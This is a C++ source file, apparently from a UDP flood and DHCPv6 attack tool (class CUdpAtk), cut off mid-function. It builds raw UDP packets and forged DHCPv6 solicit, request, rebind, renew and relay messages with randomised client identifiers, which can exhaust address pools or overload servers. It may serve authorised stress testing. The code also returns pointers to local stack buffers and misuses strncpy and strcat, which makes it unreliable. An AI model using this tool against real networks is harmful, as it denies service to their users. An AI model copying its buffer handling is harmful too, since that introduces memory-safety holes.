
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>

#include "xtool.h"
#include "pktbuild.h"
#include "CDDoSParams.h"
#include "CAttack.h"
#include "CUdpAtk.h"

int32_t CUdpAtk::attack_one_pkt(int thrd_index)
{
	pdu_l3_desc_t layer3 = get_layer3_info();
   if(m_params.m_ip_type == IP_V4)
   {
	   	char* payload_data = MsgTypeChoiceV4();
		//int pkt_len = modify_udp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN, NULL);
		int pkt_len = modify_udp(&layer3, m_pkt_buf[thrd_index], ATTACK_BUF_LEN, payload_data);

	    sendpkt(layer3.dstaddr, layer3.dport, pkt_len,  thrd_index);
   	}else{
		

	    int c = 0;
		char* payload_data_v6 = MsgTypeChoice();
		// printf("payload_data_v6:%s\n", payload_data_v6);
		
		libnet_build_udp(
		    layer3.sport,
			layer3.dport,
			LIBNET_UDP_H + m_params.m_payload_len,
			0,
			//(uint8_t*)m_params.m_payload_data,
			(uint8_t*)payload_data_v6,
			m_params.m_payload_len,
			m_libnet,
			0);
		
        libnet_build_ipv6(
        	0,
        	0,
			LIBNET_UDP_H + m_params.m_payload_len,
	        IPPROTO_UDP,
            64,
            layer3.srcaddr6,
            layer3.dstaddr6,
            NULL,/*payload*/
            0,/*paylen*/
            m_libnet,
            0);
		
		char srcname[255]={0};
		libnet_addr2name6_r(layer3.srcaddr6,1,srcname,255);
		char dstname[255]={0};
		libnet_addr2name6_r(layer3.dstaddr6,1,dstname,255);

		
		RC_LOG_INFO("%15s/%5d -> %15s/%5d\n", srcname,layer3.sport,dstname,layer3.dport);
		
		c = libnet_write(m_libnet);
        if (c == -1)
        {
            RC_LOG_INFO( "libnet_write: %s\n", libnet_geterror(m_libnet));
        }	
		libnet_clear_packet(m_libnet);

   }
	return RC_OK;
}


int32_t CUdpAtk::start()
{
	uint32_t ii = 0;
	pdu_l3_desc_t layer3 = get_layer3_info();
	
	for (ii = 0; ii < g_thrd_cnt; ii++)
	{
		m_fd[ii] = init_raw_udp_socket();
		if (m_fd[ii] == -1)
		{
			return RC_ERROR;
		}
		if(m_params.m_ip_type == IP_V4){
			
			m_pkt_buf[ii] = (char*)malloc(ATTACK_BUF_LEN);
			char* payload_data = MsgTypeChoiceV4();
			//printf("payload_data:%s\n", payload_data);
			//modify_udp(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, m_params.m_payload_data);
			modify_udp(&layer3, m_pkt_buf[ii], ATTACK_BUF_LEN, payload_data);
			//free(payload_data);
		}else{
			char errbuf[LIBNET_ERRBUF_SIZE];
			m_libnet= libnet_init(LIBNET_RAW6, /* injection type */
								NULL, /* network interface */
								errbuf); /* error buffer */
			if (m_libnet == NULL)
			{				

				RC_LOG_ERROR("libnet_init() failed: %s", errbuf);				

			}	
			libnet_seed_prand(m_libnet);			
		}

	}
	return RC_OK;
}


bool CUdpAtk::check_params()
{
   RC_LOG_INFO("THIS IS  CUdpAtk check_params FUNCTION!!!!!\n");
  /*实际上应该考虑到多线程的情况 由于g_thrd_cnt=1 所以并不会和原来不同 就暂时屏蔽
   for (int ii = 0; ii < g_thrd_cnt; ii++){
	   if (m_params.m_payload_len > 0)
	   {
		   if (m_params.m_payload_data == NULL)
		   {
			   rand_str(m_params.m_payload_data, m_params.m_payload_len);
		   }
	   }

   }*/

   return true;

}
char* CUdpAtk::struct_solicit_packet(char* client_mac)
{
	
	char msg_type[3] = "01";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 946684800;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9] = {0};
		// sprintf(DUID_time_stamp_str, "%08x", DUID_time_stamp);
		sprintf(DUID_time_stamp_str, "%08x", 0);
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		strcat(option_client, client_mac);
	}
	else
	{
		// char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";
	/*构造固定的IANA*/
	char option_IANA[1024] = {0};
	char option_iana_iaid[9]={0};
	// char option_iana_iaid[9]="aabbccdd";
	// printf("strlen(client_mac):%d, client_mac:%s", strlen(client_mac), client_mac);
	char option_t1_t2[17] = "0000000000000000";

	if(strlen(m_params.m_iaid)==0){
		for(int i=4; i<strlen(client_mac); i++){
			option_iana_iaid[i-4] = client_mac[i];
			}
	}
	else{
		strncpy(option_iana_iaid, m_params.m_iaid, sizeof(m_params.m_iaid));
	}

	
	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "000c";
		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
	}
	else
	{
		if(strlen(m_params.m_ipv6_address)==0)
		{
			if(m_params.m_ia_ta)
			{
				char option_iana_type[5] = "0004";	
				char option_iana_len[5] = "0004";
				strcat(option_IANA, option_iana_type);
				strcat(option_IANA, option_iana_len);
				strcat(option_IANA, option_iana_iaid);
				}
			else
			{
				char option_iana_type[5] = "0003";
				char option_iana_len[5] = "000c";	
				strcat(option_IANA, option_iana_type);
				strcat(option_IANA, option_iana_len);
				strcat(option_IANA, option_iana_iaid);
				strcat(option_IANA, option_t1_t2);
				}
			
			}
		else
		{
			char option_iana_type[5] = "0003";
			char option_iana_len[5] = {0};
			
			char option_ia_address_type[5] = "0005";
			char option_ia_address_len[5] = "0018";
			
			
			strcat(option_IANA, option_iana_type);
			/*统计期望ip地址个数来判断iana的长度*/
			char input_ipv6_option_tmp[512] = {0};
			int flag = 1; //统计ipv6的个数
			strncpy(input_ipv6_option_tmp, m_params.m_ipv6_address, sizeof(input_ipv6_option_tmp));
			
			for(int i=0;i<strlen(input_ipv6_option_tmp);i++)
			{
				if(input_ipv6_option_tmp[i]=='#') flag++;
			}
			//printf("input_ipv6_option_tmp:%s， %d\n", input_ipv6_option_tmp, flag);
			int option_iana_length = flag*28 + 12;
			sprintf(option_iana_len, "%04x", option_iana_length);

			strcat(option_IANA, option_iana_len);
			strcat(option_IANA, option_iana_iaid);
			strcat(option_IANA, option_t1_t2);
			/*构造IANA中的IA_address*/	
			char* temp = strtok(input_ipv6_option_tmp, "#");			
			while(temp)
			{
				//printf("%s\n",temp);
				char option_ia_address_ipv6_address[33] = {0};
				util_ipv6_to_str(option_ia_address_ipv6_address, temp);
				//printf("option_ia_address_ipv6_address:%s\n", option_ia_address_ipv6_address);
				strcat(option_IANA, option_ia_address_type);
				strcat(option_IANA, option_ia_address_len);
				strcat(option_IANA, option_ia_address_ipv6_address);
				strcat(option_IANA, option_t1_t2);
				temp = strtok(NULL, "#");
				
			}		
				}
	}
	/*构造整体的payload*/	
	char payload[1024] = {0};	
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	// printf("option_client:%s\n", option_client);
	strcat(payload, option_request);
	strcat(payload, option_IANA);

	return payload;
} 

char* CUdpAtk::struct_relay_solicit_packet(char* client_mac)
{
	
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);

	/*判断是随机获取mac地址还是从duid中回去*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char solicit_packet[1024] = {0};
	/*调用struct_solicit_packet*/
	strncpy(solicit_packet, struct_solicit_packet(client_duid_mac), sizeof(solicit_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改
	strcat(peer_address, client_duid_mac);

	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5] = {0};	
	sprintf(relay_len, "%04x", strlen(solicit_packet)/2);

	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, solicit_packet);

	return payload;
}

char* CUdpAtk::struct_information_packet(char* client_mac)
{
	
	char msg_type[3] = "0b";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 946684800;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9] = {0};
		// sprintf(DUID_time_stamp_str, "%08x", DUID_time_stamp);
		sprintf(DUID_time_stamp_str, "%08x", 0);
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		strcat(option_client, client_mac);
	}
	else
	{
		// char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";

	/*构造整体的payload*/	
	char payload[1024] = {0};	
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	// printf("option_client:%s\n", option_client);
	strcat(payload, option_request);
	// strcat(payload, option_IANA);

	return payload;
} 

char* CUdpAtk::struct_relay_information_packet(char* client_mac)
{
	
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);

	/*判断是随机获取mac地址还是从duid中回去*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char solicit_packet[1024] = {0};
	/*调用struct_information_packet*/
	strncpy(solicit_packet, struct_information_packet(client_duid_mac), sizeof(solicit_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改
	strcat(peer_address, client_duid_mac);

	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5] = {0};	
	sprintf(relay_len, "%04x", strlen(solicit_packet)/2);

	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, solicit_packet);

	return payload;
}

char* CUdpAtk::struct_request_packet(char* client_mac)
{
	char payload[1024] = {0};
	char msg_type[3] = "03";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9];
		sprintf(DUID_time_stamp_str, "%08x", 0);
		// sprintf(DUID_time_stamp_str, "%08x", DUID_time_stamp);
		
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		//printf("###############client_mac:%s\n", client_mac);
		strcat(option_client, client_mac);
	}
	else
	{
		char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造server identifier*/
	char option_server[37] = {0};
	char option_server_id_type[5] = "0002";
	char option_server_len[5] = {0};  //后续可以根据实际长度算出来
	char option_server_duid[37] = {0};
	//= m_params.m_server_id_duid;
	strncpy(option_server_duid, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));
	//printf("strlen(option_server_duid):%d, option_server_duid:%s\n", strlen(option_server_duid), option_server_duid);

	sprintf(option_server_len, "%04x", strlen(option_server_duid)/2);
	//printf("option_server_len:%s\n", option_server_len);
	strcat(option_server, option_server_id_type);
	strcat(option_server, option_server_len);
	strcat(option_server, option_server_duid);
	
	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";
	/*构造固定的IANA*/
	char option_IANA[89] = {0};

	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));

	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	else
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		//char option_t1_t2[17] = "00000e1000001518";
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";
		
		//char option_ia_address_t1_t2[17] = "00000e1000001518";
		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}

	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	strcat(payload, option_server);
	strcat(payload, option_request);
	strcat(payload, option_IANA);

	return payload;

}

char* CUdpAtk::struct_relay_request_packet(char* client_mac)
{
	/*
	* 如果指定client_duid 发包工具将只发送固定的duid报文，不指定，默认随机发送
	*/
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);
		
	
	/*判断是随机获取mac地址还是从duid中获取*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char renew_packet[1024] = {0};
	strncpy(renew_packet, struct_request_packet(client_duid_mac), sizeof(renew_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改	
	strcat(peer_address, client_duid_mac);
	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5];
	sprintf(relay_len, "%04x", strlen(renew_packet)/2);
	
	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, renew_packet);

	return payload;
}
char* CUdpAtk::struct_rebind_packet(char* client_mac)
{		
	char msg_type[3] = "06";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9] = {0};
		sprintf(DUID_time_stamp_str, "%08x", 0);
		// sprintf(DUID_time_stamp_str, "%08x", DUID_time_stamp);
		
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		strcat(option_client, client_mac);
	}
	else
	{
		// char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";
	
	/*构造固定的IANA*/
	char option_IANA[89] = {0};
	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));
	
	/*iana中前缀地址和长度*/
	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	/*iana中ipv6地址*/
	else
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		//char option_t1_t2[17] = "00000e1000001518";
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}

	/*构造整体的payload*/	
	char payload[1024] = {0};	
	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	// printf("option_client:%s\n", option_client);
	strcat(payload, option_request);
	strcat(payload, option_IANA);
	return payload;
}

char* CUdpAtk::struct_relay_rebind_packet(char* client_mac)
{
	char msg_type[3] = "0c";
	char hopcount[3] = "00";
	
	/*获取输入的ipv6地址*/
	libnet_in6_addr src_ip;
	src_ip = get_cur_srcaddr6();
	char srcname[255] = {0};
	libnet_addr2name6_r(src_ip, 1, srcname, 255);
	char link_address[33] = {0};
	util_ipv6_to_str(link_address, srcname);

	/*判断是随机获取mac地址还是从duid中获取*/
	char client_duid_mac[13] = {0};
	if(strlen(m_params.m_client_id_duid)==0)
	{
		strncpy(client_duid_mac, client_mac, sizeof(client_duid_mac));	
	}
	else{
	/*从client_duid中获取mac地址*/
		char client_duid[37] = {0};
		strncpy(client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		int i = strlen(client_duid) -12;
		int j = 0;
		for(i; i<strlen(client_duid); i++)
		{
			client_duid_mac[j] = client_duid[i];
			j++;
		}
	}

	char rebind_packet[1024] = {0};
	/*调用struct_rebind_packet， 构造rebind包*/
	strncpy(rebind_packet, struct_rebind_packet(client_duid_mac), sizeof(rebind_packet));

	/*构造peer_address的地址*/
	char peer_address[33] = {0};
	char fix_prefix[17] = "fe80000000000000";
	strcat(peer_address, fix_prefix);
	
	char fix_str[5] = "fffe";
	util_insert(client_duid_mac, fix_str, 6);  //此处对client_mac地址进行叻修改	
	strcat(peer_address, client_duid_mac);

	/*构造relay message*/
	char relay_message[5] = "0009";
	char relay_len[5] = {0};	
	sprintf(relay_len, "%04x", strlen(rebind_packet)/2);

	char payload[1024] = {0};
	strcat(payload, msg_type);
	strcat(payload, hopcount);
	strcat(payload, link_address);
	strcat(payload, peer_address);
	strcat(payload, relay_message);
	strcat(payload, relay_len);
	strcat(payload, rebind_packet);

	return payload;
}

char* CUdpAtk::struct_renew_packet(char* client_mac)
{
	char payload[1024] = {0};
	char msg_type[3] = "05";
	char transacation_id[7] = {0};
	char metachar[] = "0123456789abcdef";
	srand((unsigned) time(NULL));
	for (int i = 0; i < 6; i++)
	{
		transacation_id[i] = metachar[(rand()+this->m_curcnt_total) % 16];
	}

	/*构造client identifier*/
	char option_client[37] = {0};
	char option_id[5] = "0001";
	if(strlen(m_params.m_client_id_duid)==0)
	{
		
		char option_len[5] = "000e";
		char option_DUID_type[5] = "0001";
		char option_hw_type[5] = "0001";
		// int32_t time_stamp = 0;
		/*获取系统当前时间戳*/
		// time_t t;
		// t = time(NULL);
		// int32_t cur_time = time(&t);
		// int32_t DUID_time_stamp = cur_time - time_stamp;
		char DUID_time_stamp_str[9];
		sprintf(DUID_time_stamp_str, "%08x", 0);
		// sprintf(DUID_time_stamp_str, "%08x", DUID_time_stamp);
		
		strcat(option_client, option_id);
		strcat(option_client, option_len);
		strcat(option_client, option_DUID_type);
		strcat(option_client, option_hw_type);
		strcat(option_client, DUID_time_stamp_str);
		//printf("###############client_mac:%s\n", client_mac);
		strcat(option_client, client_mac);
	}
	else
	{
		char option_id[5] = "0001";
		char option_client_len[5] = {0};
		char option_client_duid[37] = {0};
		strncpy(option_client_duid, m_params.m_client_id_duid, sizeof(m_params.m_client_id_duid));
		sprintf(option_client_len, "%04x", strlen(option_client_duid)/2);
		strcat(option_client, option_id);
		strcat(option_client, option_client_len);
		strcat(option_client, option_client_duid);
	}

	/*构造server identifier*/
	char option_server[37] = {0};
	char option_server_id_type[5] = "0002";
	char option_server_len[5] = {0};  //后续可以根据实际长度算出来
	char option_server_duid[37] = {0};
	//= m_params.m_server_id_duid;
	strncpy(option_server_duid, m_params.m_server_id_duid, sizeof(m_params.m_server_id_duid));
	//printf("strlen(option_server_duid):%d, option_server_duid:%s\n", strlen(option_server_duid), option_server_duid);

	sprintf(option_server_len, "%04x", strlen(option_server_duid)/2);
	//printf("option_server_len:%s\n", option_server_len);
	strcat(option_server, option_server_id_type);
	strcat(option_server, option_server_len);
	strcat(option_server, option_server_duid);
	
	/*构造固定的option request*/
	char option_request[17] = "0006000400170018";
	/*构造固定的IANA*/
	char option_IANA[89] = {0};

	char option_iana_iaid[9] = {0};
	char option_t1_t2[17] = "0000000000000000";

	for(int i=4; i<strlen(client_mac); i++)
	{
		option_iana_iaid[i-4] = client_mac[i];
	}

	char option_ia_address_ipv6_address[33] = {0};
	char input_ipv6_option[32] = {0};
	strncpy(input_ipv6_option, m_params.m_ipv6_address, sizeof(input_ipv6_option));
	char input_address[33] = {0};
	char ia_address_length[3] = {0}; 
	char *p;
	p = strtok(input_ipv6_option, "/");
	if(p) 
	{
		strncpy(input_address, p, sizeof(input_address));
		util_ipv6_to_str(option_ia_address_ipv6_address, input_address);//
	}
	p=strtok(NULL, "/");
	if(p) strncpy(ia_address_length, p, sizeof(ia_address_length));

	if(m_params.m_prefix_delegetion)
	{
		char option_iana_type[5] = "0019";
		char option_iana_len[5] = "0029";
		/*构造IANA中的IA_prefix*/
		char option_ia_address_type[5] = "001a";
		char option_ia_address_len[5] = "0019";
		/*求ipv6地址前缀长度*/
		char option_ia_address_prefix_len[3] = {0};
		sprintf(option_ia_address_prefix_len, "%02x", atoi(ia_address_length));	

		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_prefix_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
	}
	else
	{
		char option_iana_type[5] = "0003";
		char option_iana_len[5] = "0028";
		
		//char option_t1_t2[17] = "00000e1000001518";
		/*构造IANA中的IA_address*/
		char option_ia_address_type[5] = "0005";
		char option_ia_address_len[5] = "0018";
		
		//char option_ia_address_t1_t2[17] = "00000e1000001518";
		strcat(option_IANA, option_iana_type);
		strcat(option_IANA, option_iana_len);
		strcat(option_IANA, option_iana_iaid);
		strcat(option_IANA, option_t1_t2);
		strcat(option_IANA, option_ia_address_type);
		strcat(option_IANA, option_ia_address_len);
		strcat(option_IANA, option_ia_address_ipv6_address);
		strcat(option_IANA, option_t1_t2);
	}

	strcat(payload, msg_type);
	strcat(payload, transacation_id);
	strcat(payload, option_client);
	strcat(payload, option_server);
	strcat(payload, option_request);
	strcat(payload, option_IANA);

	return payload;

}

char* CUdpAtk::struct_relay_renew_packet(char* client_mac)
{
	/*
